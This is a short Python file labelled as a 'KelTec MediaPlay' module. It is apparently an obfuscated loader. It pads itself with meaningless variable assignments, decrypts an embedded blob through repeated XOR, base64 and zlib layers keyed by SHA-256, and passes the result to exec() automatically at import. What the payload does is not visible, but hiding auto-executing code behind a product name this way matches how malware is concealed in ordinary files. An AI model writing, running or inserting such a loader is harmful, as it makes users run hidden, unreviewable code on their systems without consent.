# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 907578 ^ 478256
_lx1_1 = len("6c5775")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-853834)
_lx3_3 = 140378 * 0
_lx4_4 = 664458 ^ 555822
_K = '07e77e3a3f34e6b1eab98c4734f0a2dce684be994217b18072e19473746fffc5'
_M = 'mqPE/T9+DZQgjag5xzQqWY7EWfyR+PwDL0k4yMc+DUjNrcT8fzlRmiiMpWDAb3sIhMFaqJX9+AF+TTvKzDkITpijkfsjaAGfLdui'
_D = 'iSGMVJM9KuWJ5maZ9gAEA1YU8uLJVT8OFU/mqGxu/aLq9wYaLxfpqDYiUnP6pzLckjVEwHUYwwzJtdA3Cn3kbpwcSnGNJwF0yUuKSILXpk3NnQMFfut3Jc7D97ETnq3Yv3ISx4U9pdwobhVNcWD+BYxW8PerN4ZsK2v5P/R/IbBUU5njlVcnX909uDsNN7mXN4BGhFy7YZlqQ68xyAeutWYPAAEbtmqiPpAq2lPBlKvR3bh3H3HkqAnJgwsGBcIqcmrWsp3qq7VgSnsjEi4MXVQgvAwS7aX2E5AKd46xzvRoHm1Ew8hN1cEA6AAZXptdmVKWQiBQ/qcFRp34tfFmgy/FqoMMY7rveMRXpinwQapjTeAQs0/jYuJ2HAHTKLW5efvb69NcVGnIsVLEazaX4LH27gka8JFwY1/MV1P/YJ/gJWtwaM99iHZ/vwc891t4SklfI4S1bRsv1wR0ymuY+n6z3PkWDAw/biKG9ClEeOBcDRu5Pln5wQSmHs30p/RpKkEBviGAV0ncKqdPkGUM6vm5wKWbzMnUEfosJVp+mG4R61YbvnShLpgLZoomtavceCXzS4VXAI90SDnB8gQHVzgd1txEEDYWpNVb2OTMWlBI4O0wavMTOhRpu/OZ6tky7bcDdCdzz1sO1XpmZ3vkKYBpwaRPNynveQYa2TaxU9kMdl4qC8YLwRo4RxUzBjqr9gxPJNaqFjK8iLtrapup+UYEAN2MP+Udpt8soWViYAYnB2YoBcRX9Zq0GqtjoVW1kdoCxM4OIEs64mcHDXB17ZT7iwSmVX98dM0aEOsgj/U5KAJbYSosvFkz8WO169JOtlAA/3CUixX8wrOMxk5PiD5PHbOi6w8mBwPlJVx1qR/uqNPwDCuJYRO0YGRWfO1nx7fsw4BCKl6kZiRBve0xXcPI5bbDfWYcauWM5oS9CU5xbyIaOPqvUvGrbqBoEq85lQPqMQYkULP/BDvRZAVs7yur+wsez37jHRMv3c2IL+7r8jMpPW+xVfTEI1velj/TTpkdVfET02hvGPb1onSPO0i3pnKinsuRjPWahwp1Rj/nxvQiT1pmWeuJmSPLxVdobiSoVrnG9ThiHm8kUvhTsYvdKkNSDyCAUv8KH+9LYvYwHI5V3FYdgRGI/QM2Dqpv6b/8xsiu8jn06Aa9TQVkoiC7wGDu9wzuC/U6SWe3ffUlD9mH8qKOuul1QbzBmfiBS+usm6ATRlpqUXW3VBKfYmnbJ+W4k5ZKtWanUYud246SMx2TdTwlaIwVRwUKJY5MnCWJ1I+fRFqtL+TFL1iKNNU2Y3HoN+Q/Lc3V5HWUUAsSkTQs5l9D4xa+Aap2pn7x0W9RABtyt915iR8B8wfwvrQUIgQsZWAtn+5JnHq/Uzzr5Hwr2Mq2jymKEu862hXbbDUI6TMb1d9sp3he/M8CWXzBhUWSO51Urx/Oj51FlC0X8n3hU5gdk6BEsToB2HtrC4P+PAIJ/GIPoxmDQzHCrAWZGhvD7nB2jOJEhxESyPbJj/cfn1U1+a9krkYx2ypwLK9ZZ4Xk2Dbc3hPElLbKOL2dWwDSvzF1ANGldQE6Ly1AXuEPpo1Is3I31kEyuMFYubOpgFDeZdVwOy/mylZK4thdTxxYnoJmXuS7MAyGwYwIY480599G+n/p0qPHBQnr4vDmCBQ7rAQKp8CnYDuIZXM8jLePAZNceSadAvJve0FXTDTsgOoQPiWtnJ6/cqYGeH4C9vRi8pEYofoaxsEM718daih2rcPz8etqXoG87nEDUUZTpkdoXxxSaPJ4q/iHf4ipr/GkFIRGuK7+RysHvRs19f4PP3Hz5MIuZyBikng4YaiRmNzGYQNQjknLeHKZK/vD52ix'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})